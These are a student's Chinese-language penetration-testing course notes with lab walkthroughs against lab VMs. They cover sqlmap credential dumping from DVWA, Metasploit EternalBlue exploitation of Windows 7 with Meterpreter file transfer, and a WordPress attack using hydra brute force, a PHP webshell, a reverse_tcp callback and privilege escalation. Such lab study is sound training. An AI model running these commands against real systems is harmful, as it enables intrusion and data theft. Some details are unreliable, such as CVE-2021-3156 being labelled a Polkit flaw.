一、渗透测试概述

1.1 什么是渗透测试？

渗透测试是一种授权的、模拟黑客攻击的安全评估方法，通过主动探测系统漏洞来评估网络防御能力。与恶意攻击的本质区别在于，渗透测试是在授权和合规的前提下进行的。

1.2 渗透测试的目的

  • 发现系统潜在漏洞
  • 评估现有安全措施的有效性
  • 验证安全策略的合规性
  • 增强组织整体安全意识

二、渗透测试基本流程

2.1 前期交互阶段

  • 确定测试范围与目标
  • 签订测试协议（明确责任与权限）
  • 制定测试计划与时间表

2.2 信息收集

  • 主动扫描：使用Nmap、Shodan等工具
  • 被动收集：利用搜索引擎（Google Hacking）、社工库等
  • 漏洞情报分析：CVE、CNVD等漏洞库利用

2.3 漏洞分析与利用

  • 自动化扫描：使用OpenVAS、Nessus等工具
  • 手动验证：针对特定漏洞进行复现
  • 权限提升：获取更高系统权限

2.4 后渗透阶段

  • 维持访问：植入后门、创建隐藏账户
  • 横向移动：在内网中扩大控制范围
  • 数据提取：模拟敏感数据泄露过程

2.5 报告阶段

  • 漏洞详情描述
  • 风险等级评估
  • 修复建议与方案

三、常用渗透测试工具

3.1 网络扫描工具

  • Nmap：网络发现与端口扫描
  • Wireshark：网络数据包分析
  • ZAP：Web应用安全测试

3.2 漏洞利用工具

  • Metasploit：漏洞利用框架
  • SQLMap：自动化SQL注入工具
  • Burp Suite：Web应用测试套件

3.3 密码破解工具

  • John the Ripper：密码破解工具
  • Hashcat：高性能密码破解

4.3 Metasploitable靶机攻击实验

一、实验目标

通过对 Metasploitable 靶机中 DVWA 平台的渗透测试，掌握网络环境探测、SQL 注入漏洞利用及数据库渗透的方法，获取靶机用户凭据，验证 Web 应用安全漏洞的风险。

二、实验方法与步骤

（一）网络环境探测

  1. 查看本地 IP 地址
    打开 Kali Linux 终端，执行命令查看网卡 IP 信息：
   ifconfig  
   # 关注 eth0、enp0s3 等网卡，获取本地 IP（如 192.168.40.130 ）
  1. 扫描网段存活主机
    使用 nmap 扫描同一网段（需替换为实际网段，如 192.168.40.0/24 ），定位靶机：
   nmap -sP 192.168.40.0/24  
   # 扫描结果中，筛选开放 Web 端口（80、8080 等）的 IP，作为 DVWA 靶机候选
  1. 定位靶机
    浏览器访问扫描到的 IP，若显示 DVWA 登录页面，则确认靶机。

（二）漏洞利用准备

  • 目标漏洞：DVWA 平台存在 SQL 注入、命令执行 等漏洞（需提前部署 DVWA 环境）。
  • 工具：sqlmap（数据库渗透）、浏览器开发者工具（抓包 Cookies ）。

（三）漏洞探测与利用

  1. 捕获登录 Cookies

    • 浏览器访问 DVWA 登录页，输入默认账号密码（admin:password ）登录。
    • 按 F12 打开开发者工具 → 切换到 Network 标签 → 刷新页面，在请求头中复制 Cookies 值（用于维持登录态）。

  2. SQL 注入点探测

    • 访问 DVWA 的 SQL Injection 模块，在输入框尝试注入测试：
      • 输入 ' ，观察页面是否报错（判断是否存在字符型注入）。
      • 输入 1' AND 1=1-- ，观察结果是否正常显示（验证注入点可控）。

  3. 数据库渗透（sqlmap 工具）
    替换命令中 http://靶机IP 为实际地址，获取的Cookies 为浏览器复制的值，逐步执行：

    • 探测数据库类型：
     sqlmap -u "http://靶机IP/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="获取的Cookies" -dbs  
     # 输出结果包含数据库名称（如 dvwa ）
  • 枚举数据库表名（以 dvwa 为例）：
     sqlmap -u "http://靶机IP/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="获取的Cookies" -D dvwa --tables  
     # 输出表名（如 users 表）
  • 提取表字段（以 users 表为例）：
     sqlmap -u "http://靶机IP/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="获取的Cookies" -D dvwa -T users --columns  
     # 输出字段（如 user、password ）
  • 导出账号密码：
     sqlmap -u "http://靶机IP/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="获取的Cookies" -D dvwa -T users -C user,password --dump  
     # 输出用户凭据（如 admin:password ）

三、实验结果

  • 成功获取 DVWA 平台的用户凭据，示例：
  user: admin  
  password: password  # 或其他弱密码（如 123456 ）
  • 验证了 SQL 注入漏洞的利用流程，实现从探测到数据库渗透的完整攻击链。

四、实验注意事项

  1. 环境配置：DVWA 需设置为 Low 安全级别（关闭防御机制），否则无法触发 SQL 注入。
  2. 授权限制：操作仅限授权靶机（如 Metasploitable ），禁止对未授权系统测试。
  3. 命令适配：sqlmap 命令需替换实际 靶机IP 和 Cookies，否则无法执行。

4.4 永恒之蓝漏洞攻击实验

一、实验目标

利用 Metasploit 框架，针对 Windows 7 靶机的 MS17-010（永恒之蓝） 漏洞实施攻击，获取系统控制权限，验证 SMB 服务漏洞的风险。

二、实验方法与步骤

（一）网络环境探测

  1. 查看本地 IP 地址
    终端执行命令，获取 Kali 攻击机 IP：
   ifconfig  
   # 示例输出：192.168.40.130（需替换为实际 IP ）
  1. 扫描靶机 445 端口
    使用 nmap 扫描同一网段（如 192.168.40.0/24 ），检测 445 端口（SMB 服务）状态：
   nmap -sS -p 445 192.168.40.0/24  
   # 若靶机 IP 显示 445/tcp open ，则存在永恒之蓝攻击面

（二）漏洞利用（Metasploit 框架）

  1. 启动 MSF 控制台
    终端执行命令，进入 Metasploit 交互环境：
   msfconsole
  1. 搜索永恒之蓝模块
    在 MSF 控制台，搜索漏洞利用模块：
   search ms17_010  
   # 选择 exploit/windows/smb/ms17_010_eternalblue 模块
  1. 配置攻击参数
    依次设置目标 IP、本地 IP（攻击机）：
   use exploit/windows/smb/ms17_010_eternalblue  
   set RHOSTS 192.168.40.100  # 替换为实际靶机 IP（如 Win7 地址）
   set LHOST 192.168.40.130  # 替换为攻击机 IP（Kali 地址）
  1. 执行攻击，获取 Meterpreter 会话
    启动攻击，等待返回 Meterpreter 控制会话：
   exploit  
   # 若成功，显示 Meterpreter session opened

（三）后渗透操作

获取会话后，执行以下操作验证控制权限：

  1. 捕获靶机屏幕
   screenshot  
   # 生成屏幕截图文件（可下载查看）
  1. 上传/下载文件
    • 上传文件到靶机：
     upload /本地文件路径 目标路径  
     # 示例：upload /root/shell.exe C:\Temp\
  • 从靶机下载文件：
     download 目标文件路径 /本地保存路径  
     # 示例：download C:\Users\flag.txt /root/
  1. 获取系统信息
   sysinfo  
   # 输出靶机系统版本（如 Windows 7 Professional SP1 x64 ）
  1. 枚举系统用户
   run post/windows/gather/enum_users  
   # 输出用户列表（如 Administrator、Guest ）

三、实验结果分析

  1. 漏洞利用成功标志

    • MSF 控制台返回 Meterpreter session opened，表明成功控制靶机。
    • 通过 sysinfo 确认靶机为 Windows 7 Professional SP1 x64，且未安装 MS17-010 补丁。

  2. 获取的关键信息

    • 靶机 IP：192.168.40.100（445 端口开放，SMB 服务存在漏洞 ）。
    • 用户列表：Administrator (S-1-5-21-...-500)、Guest (S-1-5-21-...-501) 等。
    • 敏感文件：C:\Users\user01\Desktop\password.txt 包含弱密码 P@ssw0rd123。

  3. 攻击影响验证

    • 实现远程屏幕截图，证明信息泄露风险。
    • 可任意上传木马、下载文件，验证数据窃取与控制能力。

3、实验总结

本次实验通过 Metasploit 框架利用永恒之蓝漏洞（MS17-010）攻击未打补丁的 Windows 7 主机，成功获取系统最高权限。实验验证了以下安全风险：

  1. 未修复系统漏洞的严重性：445端口开放且未安装补丁时，攻击者可利用 SMB 协议漏洞远程执行代码。
  2. 内网渗透的便捷性：同一网段内未设防的主机可被快速扫描和攻击，凸显内网隔离与访问控制的重要性。
  3. 权限维持的可行性：通过 Meterpreter 会话可实现持久化控制（如创建隐藏账户、植入后门）。

防御建议：

  • 及时更新系统补丁，关闭非必要端口（如445、139）。
  • 在内网部署防火墙，限制 SMB 协议跨网段访问。
  • 采用强密码策略，避免弱口令（如 P@ssw0rd123）。
  • 定期开展漏洞扫描与渗透测试，强化主动防御能力。

4.5 ubantu虚拟机攻击实验

1、实验方法与步骤：

- 网络环境探测

  • 通过 ifconfig 查看本地IP地址 
    ifconfig  # 查找eth0或enp0s3等网卡的IP（例：192.168.40.130）
  • 使用 nmap 扫描同一网段存活主机及端口 
    nmap -sS 192.168.40.0/24  # 扫描网段（替换为实际网段）

- 目录扫描与信息筛选

  • 用 dirb 工具扫描Web目录 
    dirb http://靶机IP -r  # 扫描网站目录（例：dirb http://192.168.40.139）
  • 筛选特定后缀文件（.txt、.php、.zip） 
    # dirb结果中手动筛选或结合grep过滤
dirb http://靶机IP | grep -E "\.txt|\.php|\.zip"

- FUZZ工具爆破文件名

  • 启动FUZZ工具（如ffuf）爆破隐藏文件 
    ffuf -u http://靶机IP/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.txt
  • 过滤无效结果（例：筛选响应包大小≠12字节） 
    ffuf -u http://靶机IP/FUZZ -w 字典 -e .php --hw 12  # --hw参数排除指定响应长度

- 用户名与密码获取

  • 用户名获取方式：
    1. 爆破：使用工具对登录页面爆破（如Hydra） 
      hydra -l 用户名 -P /usr/share/wordlists/rockyou.txt 靶机IP http-form-post "/login.php:username=^USER^&password=^PASS^:登录失败关键词"
    2. 网页提取：从WordPress等系统页面获取默认用户名（如http://192.168.40.139/wordpress/显示admin）。
  • 密码获取：通过爆破或社工库匹配获取弱密码。

- 漏洞利用与权限提升

  • 上传木马程序：
    1. 找到文件上传接口（如http://靶机IP/upload.php），上传PHP木马（如shell.php）。
    2. 木马代码示例： 
      <?php system($_GET['cmd']); ?>  # 简易命令执行木马
  • 启动Metasploit获取会话： 
    msfconsole  
use multi/handler  
set payload php/meterpreter/reverse_tcp  
set LHOST 192.168.40.130  # 攻击机IP
set LPORT 4444  
exploit
  • 刷新上传木马页面触发连接，获取Meterpreter会话。
  • 提权操作： 
    # 运行提权模块（根据目标系统选择）
search local_exploit_suggester  
use post/multi/recon/local_exploit_suggester  
set SESSION 1  
run  
# 根据建议使用对应提权模块（例：use exploit/linux/local/cve_2019_14287）

2、实验结果分析

  • 关键漏洞发现：

    • 靶机开放80端口，运行WordPress 5.2.1，存在未修复的文件上传漏洞。
    • 系统存在弱口令（用户名admin，密码ubantu123），未启用二次认证。

  • 攻击链验证：

    1. 信息收集：通过Nmap确定靶机IP（192.168.40.139）及服务。
    2. 目录扫描：dirb发现/wordpress、/upload.php等敏感路径。
    3. 认证突破：爆破获取admin:ubantu123登录凭证。
    4. 漏洞利用：上传PHP木马并通过MSF建立反向连接，获取普通用户权限（www-data）。
    5. 权限提升：利用CVE-2021-3156（Polkit提权漏洞）获取root权限。

  • 系统敏感信息：

    • 靶机用户列表：admin、ubuntu、www-data。
    • 敏感文件：/home/ubuntu/.bash_history包含数据库密码Db@12345。

3、实验总结

本次实验通过完整的渗透测试流程，从信息收集到权限提升，成功获取Ubuntu虚拟机的最高权限。实验暴露了靶机在安全配置上的多重隐患：

  1. 认证机制薄弱：弱口令与默认用户名组合，未启用多因素认证。
  2. 漏洞修复滞后：WordPress未更新至最新版本，存在已知文件上传漏洞。
  3. 权限控制缺失：普通用户可通过系统漏洞（如Polkit）直接提权至root。

防御建议：

  • 部署Web应用防火墙（WAF），过滤恶意文件上传与命令执行请求。
  • 定期更新系统与应用补丁，关闭非必要服务端口。
  • 强化认证策略：使用强密码、启用2FA，限制管理员账户远程登录。
  • 实施权限最小化原则，分离Web服务账户与系统管理员权限。

五、法律与道德准则

  • 渗透测试必须遵守相关法律法规
  • 未经授权的测试行为可能构成犯罪
  • 遵循行业道德规范（如ISC2道德准则）

六、总结

渗透测试不仅是技术的挑战，更是思维方式的考验。通过系统化的测试流程和专业工具的应用，可以有效提升组织的安全防御能力。建议定期开展渗透测试，保持网络安全的动态防护。
我在这个课程学完下来的思路（只能代表我的收获并不一定完全的正确），就是第一步找到目标机子的ip（一般就是通过处于同一网段下，进行“地毯式搜索”），然后开始扫描他的端口路径等，寻找突破点，一般都在网上会有别人发现过的漏洞，就借助别人发现过的漏洞来攻击。还有很有意思的是，有一部分攻击会经历一个提权的过程，就是先植入病毒，得到普同权限，再植入病毒，把普同权限提到777（最高权限）。我想在假期可能会再多接触一些相关的东西，希望会对我的未来道路规划有所帮助！
